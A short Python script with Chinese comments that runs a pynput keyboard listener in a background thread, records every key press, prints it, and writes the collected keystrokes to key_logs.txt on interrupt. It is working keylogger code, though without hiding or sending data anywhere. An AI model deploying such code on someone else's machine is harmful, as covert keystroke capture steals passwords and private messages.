from pynput import keyboard
import threading

# 全局变量，用于保存键盘输入记录
key_logs = []

def on_press(key):
    # 处理按键按下事件
    try:
        print('按键按下:', key.char)
        key_logs.append(str(key.char))  # 将按键记录添加到列表中
    except AttributeError:
        if key == keyboard.Key.space:
            key_logs.append(' ')
        elif key == keyboard.Key.enter:
            key_logs.append('\n')

def write_to_file():
    # 将键盘输入记录写入文件
    with open('key_logs.txt', 'w') as file:
        file.write(''.join(key_logs))

def background_task():
    # 创建键盘监听器
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # 进入监听状态
    listener.join()

# 创建一个线程来运行后台任务
background_thread = threading.Thread(target=background_task)
background_thread.daemon = True
background_thread.start()

# 主程序继续执行其他操作
try:
    while True:
        pass  # 可以添加其他需要执行的操作
except KeyboardInterrupt:
    # 在程序退出时将键盘记录写入文件
    write_to_file()
